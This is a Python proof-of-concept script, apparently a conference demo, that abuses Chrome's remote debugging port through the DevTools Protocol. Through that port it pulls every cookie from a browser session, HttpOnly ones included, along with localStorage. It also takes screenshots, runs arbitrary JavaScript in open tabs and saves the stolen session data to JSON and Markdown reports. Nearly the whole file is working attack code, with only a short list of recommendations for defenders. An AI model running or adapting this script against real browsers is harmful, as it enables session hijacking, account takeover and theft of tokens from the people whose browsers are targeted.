#!/usr/bin/env python3
"""
Chrome Remote Debugging Exploitation PoC
BugCon 2025 - Core Demo Script

Author: Your Name
Date: November 2025

This script demonstrates how to abuse Chrome's remote debugging protocol
to extract sensitive data from active browser sessions.

Requirements:
    pip install websocket-client requests

Usage:
    1. Start Chrome with: chrome.exe --remote-debugging-port=9222
    2. Run this script: python chrome_hijack_basic.py
"""

import json
import requests
import websocket
import base64
import sys
import os
import platform
from datetime import datetime
from typing import List, Dict, Optional

# Fix Windows console encoding issues
if platform.system() == "Windows":
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass

# Configuration
DEBUG_PORT = 9222
DEBUG_HOST = "127.0.0.1"
DEBUG_URL = f"http://{DEBUG_HOST}:{DEBUG_PORT}"

# ANSI color codes for output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'


class ChromeDebugHijacker:
    """Main class for Chrome debugging port exploitation"""
    
    def __init__(self, host: str = DEBUG_HOST, port: int = DEBUG_PORT):
        self.host = host
        self.port = port
        self.base_url = f"http://{host}:{port}"
        self.ws = None
        self.message_id = 0
        
    def check_debugging_available(self) -> bool:
        """Check if Chrome debugging port is accessible"""
        try:
            response = requests.get(f"{self.base_url}/json/version", timeout=5)
            if response.status_code == 200:
                version_info = response.json()
                print(f"{Colors.GREEN}[+] Chrome debugging port found!{Colors.RESET}")
                print(f"{Colors.CYAN}    Browser: {version_info.get('Browser', 'Unknown')}{Colors.RESET}")
                print(f"{Colors.CYAN}    User Agent: {version_info.get('User-Agent', 'Unknown')}{Colors.RESET}")
                print(f"{Colors.CYAN}    WebSocket: {version_info.get('webSocketDebuggerUrl', 'Unknown')}{Colors.RESET}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[-] No debugging port found: {e}{Colors.RESET}")
            return False
        return False
    
    def list_targets(self) -> List[Dict]:
        """Enumerate all available debugging targets (tabs/pages)"""
        try:
            response = requests.get(f"{self.base_url}/json/list", timeout=5)
            if response.status_code == 200:
                targets = response.json()
                print(f"\n{Colors.GREEN}[+] Found {len(targets)} target(s):{Colors.RESET}")
                for idx, target in enumerate(targets):
                    print(f"\n{Colors.YELLOW}    Target {idx}:{Colors.RESET}")
                    print(f"{Colors.CYAN}      Title: {target.get('title', 'No title')}{Colors.RESET}")
                    print(f"{Colors.CYAN}      URL: {target.get('url', 'No URL')}{Colors.RESET}")
                    print(f"{Colors.CYAN}      Type: {target.get('type', 'Unknown')}{Colors.RESET}")
                    print(f"{Colors.DIM}      ID: {target.get('id', 'No ID')}{Colors.RESET}")
                return targets
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[-] Failed to list targets: {e}{Colors.RESET}")
            return []
        return []
    
    def connect_to_target(self, target: Dict) -> bool:
        """Establish WebSocket connection to a specific target"""
        ws_url = target.get('webSocketDebuggerUrl')
        if not ws_url:
            print(f"{Colors.RED}[-] No WebSocket URL available for this target{Colors.RESET}")
            return False
        
        try:
            print(f"\n{Colors.MAGENTA}[+] Connecting to target: {target.get('title', 'Unknown')}{Colors.RESET}")
            print(f"{Colors.CYAN}    WebSocket URL: {ws_url}{Colors.RESET}")
            self.ws = websocket.create_connection(ws_url)
            print(f"{Colors.GREEN}{Colors.BOLD}[+] WebSocket connection established!{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.RED}[-] Failed to connect: {e}{Colors.RESET}")
            return False
    
    def send_cdp_command(self, method: str, params: Optional[Dict] = None) -> Optional[Dict]:
        """Send a Chrome DevTools Protocol command and get response"""
        if not self.ws:
            print(f"{Colors.RED}[-] No active WebSocket connection{Colors.RESET}")
            return None
        
        self.message_id += 1
        command = {
            "id": self.message_id,
            "method": method,
            "params": params or {}
        }
        
        try:
            self.ws.send(json.dumps(command))
            response = self.ws.recv()
            return json.loads(response)
        except Exception as e:
            print(f"{Colors.RED}[-] CDP command failed: {e}{Colors.RESET}")
            return None
    
    def extract_cookies(self) -> List[Dict]:
        """Extract all cookies from the current page"""
        print(f"\n{Colors.YELLOW}[*] Extracting cookies...{Colors.RESET}")
        response = self.send_cdp_command("Network.getAllCookies")
        
        if response and "result" in response:
            cookies = response["result"].get("cookies", [])
            print(f"{Colors.GREEN}[+] Extracted {Colors.BOLD}{len(cookies)}{Colors.RESET}{Colors.GREEN} cookie(s):{Colors.RESET}")
            
            for cookie in cookies[:10]:  # Show first 10
                print(f"\n{Colors.MAGENTA}    Name: {cookie.get('name')}{Colors.RESET}")
                print(f"{Colors.CYAN}    Domain: {cookie.get('domain')}{Colors.RESET}")
                value_str = f"{cookie.get('value')[:50]}..." if len(cookie.get('value', '')) > 50 else cookie.get('value')
                print(f"{Colors.WHITE}    Value: {value_str}{Colors.RESET}")
                secure_color = Colors.GREEN if cookie.get('secure') else Colors.RED
                print(f"    Secure: {secure_color}{cookie.get('secure')}{Colors.RESET}")
                httponly_color = Colors.GREEN if cookie.get('httpOnly') else Colors.RED
                print(f"    HttpOnly: {httponly_color}{cookie.get('httpOnly')}{Colors.RESET}")
            
            if len(cookies) > 10:
                print(f"\n{Colors.YELLOW}    ... and {len(cookies) - 10} more cookies{Colors.RESET}")
            
            return cookies
        else:
            print(f"{Colors.RED}[-] Failed to extract cookies{Colors.RESET}")
            return []
    
    def capture_screenshot(self, filename: str = "screenshot.png") -> bool:
        """Capture a screenshot of the current page"""
        print(f"\n{Colors.YELLOW}[*] Capturing screenshot...{Colors.RESET}")
        response = self.send_cdp_command("Page.captureScreenshot")
        
        if response and "result" in response:
            image_data = response["result"].get("data")
            if image_data:
                # Decode base64 and save
                image_bytes = base64.b64decode(image_data)
                with open(filename, "wb") as f:
                    f.write(image_bytes)
                print(f"{Colors.GREEN}[+] Screenshot saved to: {Colors.CYAN}{filename}{Colors.RESET}")
                return True
        
        print(f"{Colors.RED}[-] Failed to capture screenshot{Colors.RESET}")
        return False
    
    def execute_javascript(self, code: str) -> Optional[Dict]:
        """Execute arbitrary JavaScript in the target page"""
        # Truncate code display for cleaner output
        code_preview = code.strip().replace('\n', ' ')[:80]
        print(f"\n{Colors.YELLOW}[*] Executing JavaScript...{Colors.RESET}")
        
        response = self.send_cdp_command("Runtime.evaluate", {
            "expression": code,
            "returnByValue": True
        })
        
        if response and "result" in response:
            result = response["result"].get("result", {})
            result_type = result.get('type')
            result_value = result.get('value')
            
            print(f"{Colors.GREEN}[+] JavaScript execution successful!{Colors.RESET}")
            print(f"{Colors.CYAN}    Type: {result_type}{Colors.RESET}")
            
            # Pretty print based on type
            if result_type == 'object' and isinstance(result_value, dict):
                print(f"{Colors.WHITE}    Result:{Colors.RESET}")
                for key, value in result_value.items():
                    # Color-code boolean values
                    if isinstance(value, bool):
                        value_color = Colors.GREEN if value else Colors.RED
                        print(f"{Colors.MAGENTA}      {key}: {value_color}{value}{Colors.RESET}")
                    else:
                        print(f"{Colors.MAGENTA}      {key}: {Colors.WHITE}{value}{Colors.RESET}")
            elif result_type == 'string':
                # Truncate long strings
                value_str = str(result_value)
                if len(value_str) > 200:
                    value_str = value_str[:200] + "..."
                print(f"{Colors.WHITE}    Value: {value_str}{Colors.RESET}")
            else:
                print(f"{Colors.WHITE}    Value: {result_value}{Colors.RESET}")
            
            return result
        else:
            print(f"{Colors.RED}[-] JavaScript execution failed{Colors.RESET}")
            return None
    
    def extract_local_storage(self) -> Dict:
        """Extract localStorage data from the current page"""
        print(f"\n{Colors.YELLOW}[*] Extracting localStorage...{Colors.RESET}")
        
        # Get the security origin first
        js_code = "window.location.origin"
        origin_response = self.send_cdp_command("Runtime.evaluate", {
            "expression": js_code,
            "returnByValue": True
        })
        
        if not origin_response or "result" not in origin_response:
            print(f"{Colors.RED}[-] Failed to get page origin{Colors.RESET}")
            return {}
        
        origin = origin_response["result"]["result"].get("value", "")
        
        # Now get localStorage
        response = self.send_cdp_command("DOMStorage.getDOMStorageItems", {
            "storageId": {
                "securityOrigin": origin,
                "isLocalStorage": True
            }
        })
        
        if response and "result" in response:
            items = response["result"].get("entries", [])
            print(f"{Colors.GREEN}[+] Extracted {Colors.BOLD}{len(items)}{Colors.RESET}{Colors.GREEN} localStorage item(s):{Colors.RESET}")
            
            storage_dict = {}
            for key, value in items:
                storage_dict[key] = value
                value_str = f"{value[:100]}..." if len(value) > 100 else value
                print(f"{Colors.MAGENTA}    {key}: {Colors.WHITE}{value_str}{Colors.RESET}")
            
            return storage_dict
        else:
            print(f"{Colors.RED}[-] Failed to extract localStorage{Colors.RESET}")
            return {}
    
    def disconnect(self):
        """Close the WebSocket connection"""
        if self.ws:
            self.ws.close()
            print(f"\n{Colors.YELLOW}[+] Disconnected from target{Colors.RESET}")
    
    def generate_report(self, target: Dict, version_info: Dict, cookies: List[Dict], 
                       storage: Dict, screenshot_path: str, output_dir: str = "../output") -> tuple:
        """Generate detailed exploitation report in JSON and Markdown formats"""
        
        # Ensure output directory exists
        os.makedirs(output_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        timestamp_file = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Prepare report data
        report_data = {
            "exploitation_report": {
                "timestamp": timestamp,
                "target": {
                    "title": target.get('title', 'Unknown'),
                    "url": target.get('url', 'Unknown'),
                    "type": target.get('type', 'Unknown'),
                    "id": target.get('id', 'Unknown')
                },
                "browser": {
                    "version": version_info.get('Browser', 'Unknown'),
                    "user_agent": version_info.get('User-Agent', 'Unknown'),
                    "webkit_version": version_info.get('WebKit-Version', 'Unknown')
                },
                "extracted_data": {
                    "cookies": {
                        "count": len(cookies),
                        "details": [
                            {
                                "name": c.get('name'),
                                "domain": c.get('domain'),
                                "value": c.get('value'),
                                "path": c.get('path'),
                                "secure": c.get('secure'),
                                "httpOnly": c.get('httpOnly'),
                                "sameSite": c.get('sameSite'),
                                "expires": c.get('expires', -1)
                            } for c in cookies
                        ]
                    },
                    "localStorage": {
                        "count": len(storage),
                        "items": storage
                    },
                    "screenshot": {
                        "filename": os.path.basename(screenshot_path),
                        "path": screenshot_path
                    }
                },
                "statistics": {
                    "total_cookies": len(cookies),
                    "secure_cookies": sum(1 for c in cookies if c.get('secure')),
                    "httponly_cookies": sum(1 for c in cookies if c.get('httpOnly')),
                    "session_cookies": sum(1 for c in cookies if c.get('expires', -1) == -1),
                    "localStorage_items": len(storage)
                }
            }
        }
        
        # Save JSON report (timestamped)
        json_filename = f"exploitation_report_{timestamp_file}.json"
        json_path = os.path.join(output_dir, json_filename)
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        # Also save as "latest" for real-time slides loading
        latest_json_path = os.path.join(output_dir, "latest_exploitation_report.json")
        with open(latest_json_path, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        # Generate Markdown report
        md_filename = f"exploitation_report_{timestamp_file}.md"
        md_path = os.path.join(output_dir, md_filename)
        
        markdown_content = f"""# Chrome Remote Debugging Exploitation Report

**Generated:** {timestamp}

---

## Target Information

| Field | Value |
|-------|-------|
| **Title** | {target.get('title', 'Unknown')} |
| **URL** | {target.get('url', 'Unknown')} |
| **Type** | {target.get('type', 'Unknown')} |
| **Target ID** | {target.get('id', 'Unknown')} |

---

## Browser Information

| Field | Value |
|-------|-------|
| **Browser** | {version_info.get('Browser', 'Unknown')} |
| **User Agent** | {version_info.get('User-Agent', 'Unknown')[:100]}... |
| **WebKit Version** | {version_info.get('WebKit-Version', 'Unknown')} |

---

## Extraction Summary

### Statistics

| Metric | Count |
|--------|-------|
| **Total Cookies** | {len(cookies)} |
| **Secure Cookies** | {sum(1 for c in cookies if c.get('secure'))} |
| **HttpOnly Cookies** | {sum(1 for c in cookies if c.get('httpOnly'))} |
| **Session Cookies** | {sum(1 for c in cookies if c.get('expires', -1) == -1)} |
| **localStorage Items** | {len(storage)} |

---

## Extracted Cookies

Total: **{len(cookies)} cookies**

"""
        
        # Add cookie details
        for idx, cookie in enumerate(cookies, 1):
            value_preview = cookie.get('value', '')[:50] + ('...' if len(cookie.get('value', '')) > 50 else '')
            markdown_content += f"""### Cookie {idx}: {cookie.get('name')}

| Property | Value |
|----------|-------|
| **Domain** | {cookie.get('domain')} |
| **Path** | {cookie.get('path', '/')} |
| **Value** | `{value_preview}` |
| **Secure** | {cookie.get('secure')} |
| **HttpOnly** | {cookie.get('httpOnly')} |
| **SameSite** | {cookie.get('sameSite', 'None')} |
| **Session** | {'Yes' if cookie.get('expires', -1) == -1 else 'No'} |

"""
        
        # Add localStorage data
        markdown_content += f"""---

## localStorage Data

Total: **{len(storage)} items**

"""
        
        if storage:
            markdown_content += "| Key | Value Preview |\n|-----|---------------|\n"
            for key, value in storage.items():
                value_preview = str(value)[:80] + ('...' if len(str(value)) > 80 else '')
                markdown_content += f"| `{key}` | `{value_preview}` |\n"
        else:
            markdown_content += "*No localStorage data found*\n"
        
        # Add screenshot info
        markdown_content += f"""
---

## Captured Artifacts

- **Screenshot:** `{os.path.basename(screenshot_path)}`
- **Location:** `{screenshot_path}`

---

## Security Impact

### Potential Attack Vectors

✅ **Session Hijacking** - {len(cookies)} session cookies can be replayed  
✅ **Account Takeover** - Full access to authenticated session  
✅ **2FA Bypass** - Session tokens bypass multi-factor authentication  
✅ **Data Exfiltration** - {len(storage)} localStorage items containing sensitive data  
✅ **Visual Surveillance** - Screenshot captured user activity  

### Affected Security Controls

- **Same-Origin Policy:** Bypassed via CDP  
- **HttpOnly Cookies:** {sum(1 for c in cookies if c.get('httpOnly'))} HttpOnly cookies extracted  
- **Secure Flag:** {sum(1 for c in cookies if c.get('secure'))} secure cookies accessed  

---

## Recommendations

**For Defenders:**
1. Monitor for Chrome processes with `--remote-debugging-port` flag
2. Block TCP port 9222 at firewall level
3. Implement process monitoring and alerting
4. Use endpoint security to detect debugging flags

**For Incident Response:**
1. Force session invalidation on affected accounts
2. Rotate authentication tokens and secrets
3. Review access logs for suspicious activity
4. Force password resets if credential theft suspected

---

*Report generated by Chrome Remote Debugging Exploitation PoC*  
*BugCon 2025 - Security Demonstration*
"""
        
        with open(md_path, 'w', encoding='utf-8') as f:
            f.write(markdown_content)
        
        # Also save as "latest" for real-time slides loading
        latest_md_path = os.path.join(output_dir, "latest_exploitation_report.md")
        with open(latest_md_path, 'w', encoding='utf-8') as f:
            f.write(markdown_content)
        
        return json_path, md_path


def main():
    """Main exploitation flow"""
    print(f"\n{Colors.RED}{Colors.BOLD}{'=' * 70}")
    print("Chrome Remote Debugging Exploitation PoC")
    print("BugCon 2025 Demo - Session Hijacking")
    print(f"{'=' * 70}{Colors.RESET}\n")
    
    # Initialize the hijacker
    hijacker = ChromeDebugHijacker()
    
    # Step 1: Check if debugging port is available and get version info
    try:
        response = requests.get(f"{hijacker.base_url}/json/version", timeout=5)
        if response.status_code != 200:
            raise Exception("Debugging port not accessible")
        version_info = response.json()
        print(f"{Colors.GREEN}[+] Chrome debugging port found!{Colors.RESET}")
        print(f"{Colors.CYAN}    Browser: {version_info.get('Browser', 'Unknown')}{Colors.RESET}")
        print(f"{Colors.CYAN}    User Agent: {version_info.get('User-Agent', 'Unknown')}{Colors.RESET}")
        print(f"{Colors.CYAN}    WebSocket: {version_info.get('webSocketDebuggerUrl', 'Unknown')}{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}{Colors.BOLD}[-] Chrome debugging port not accessible!{Colors.RESET}")
        print(f"\n{Colors.YELLOW}To enable debugging, start Chrome with:{Colors.RESET}")
        print(f'{Colors.WHITE}    chrome.exe --remote-debugging-port=9222 --user-data-dir="C:\\temp\\chrome-debug"{Colors.RESET}')
        print(f"\n{Colors.YELLOW}On Linux/Mac:{Colors.RESET}")
        print(f'{Colors.WHITE}    google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-debug{Colors.RESET}')
        sys.exit(1)
    
    # Step 2: List all available targets
    targets = hijacker.list_targets()
    if not targets:
        print(f"{Colors.RED}[-] No targets found. Open some tabs in Chrome first.{Colors.RESET}")
        sys.exit(1)
    
    # Step 3: Select a target (for demo, we'll use the first non-background page)
    target = None
    for t in targets:
        if t.get('type') == 'page' and t.get('url', '').startswith('http'):
            target = t
            break
    
    if not target:
        print(f"{Colors.RED}[-] No suitable page target found{Colors.RESET}")
        sys.exit(1)
    
    # Step 4: Connect to the selected target
    if not hijacker.connect_to_target(target):
        sys.exit(1)
    
    # Step 5: Enable necessary CDP domains
    print(f"\n{Colors.YELLOW}[*] Enabling CDP domains...{Colors.RESET}")
    hijacker.send_cdp_command("Network.enable")
    hijacker.send_cdp_command("Page.enable")
    hijacker.send_cdp_command("DOMStorage.enable")
    print(f"{Colors.GREEN}[+] Domains enabled{Colors.RESET}")
    
    # Step 6: Perform the exploitation
    print(f"\n{Colors.RED}{Colors.BOLD}{'=' * 70}")
    print("EXPLOITATION PHASE - Extracting Sensitive Data")
    print(f"{'=' * 70}{Colors.RESET}")
    
    # Extract cookies
    cookies = hijacker.extract_cookies()
    
    # Capture screenshot
    screenshot_path = "../output/hijacked_screenshot.png"
    hijacker.capture_screenshot(screenshot_path)
    
    # Demonstrate JavaScript execution - extract page metadata
    js_demo_code = """
    ({
        title: document.title,
        url: window.location.href,
        forms: document.forms.length,
        inputs: document.querySelectorAll('input').length,
        scripts: document.scripts.length,
        cookies_accessible: document.cookie.length > 0,
        local_storage_keys: Object.keys(localStorage).length
    })
    """
    hijacker.execute_javascript(js_demo_code)
    
    # Extract localStorage
    storage = hijacker.extract_local_storage()
    
    # Step 7: Generate reports
    print(f"\n{Colors.YELLOW}[*] Generating exploitation reports...{Colors.RESET}")
    try:
        json_report, md_report = hijacker.generate_report(
            target=target,
            version_info=version_info,
            cookies=cookies,
            storage=storage,
            screenshot_path=screenshot_path,
            output_dir="../output"
        )
        print(f"{Colors.GREEN}[+] JSON report saved to: {Colors.CYAN}{json_report}{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Markdown report saved to: {Colors.CYAN}{md_report}{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Latest reports saved as: {Colors.CYAN}latest_exploitation_report.json/md{Colors.RESET} {Colors.GREEN}(for slides){Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[-] Failed to generate reports: {e}{Colors.RESET}")
    
    # Step 8: Summary
    print(f"\n{Colors.GREEN}{Colors.BOLD}{'=' * 70}")
    print("EXPLOITATION COMPLETE - Summary")
    print(f"{'=' * 70}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Extracted {Colors.BOLD}{len(cookies)}{Colors.RESET}{Colors.GREEN} cookies (including HttpOnly){Colors.RESET}")
    print(f"{Colors.GREEN}[+] Extracted {Colors.BOLD}{len(storage)}{Colors.RESET}{Colors.GREEN} localStorage items{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Executed arbitrary JavaScript on target page{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Screenshot saved to: {Colors.CYAN}{screenshot_path}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Reports generated in: {Colors.CYAN}../output/{Colors.RESET}")
    print(f"\n{Colors.RED}{Colors.BOLD}[!] This data can be used for:{Colors.RESET}")
    print(f"{Colors.YELLOW}    ⚡ Session hijacking (cookies bypass 2FA){Colors.RESET}")
    print(f"{Colors.YELLOW}    ⚡ Account takeover (full session access){Colors.RESET}")
    print(f"{Colors.YELLOW}    ⚡ Credential theft (localStorage tokens){Colors.RESET}")
    print(f"{Colors.YELLOW}    ⚡ Crypto wallet access (stored keys){Colors.RESET}")
    print(f"{Colors.YELLOW}    ⚡ Arbitrary code execution (DOM manipulation){Colors.RESET}")
    
    # Step 9: Cleanup
    hijacker.disconnect()
    
    print(f"\n{Colors.MAGENTA}{Colors.BOLD}{'=' * 70}")
    print("Demo Complete!")
    print(f"{'=' * 70}{Colors.RESET}\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[-] Unexpected error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)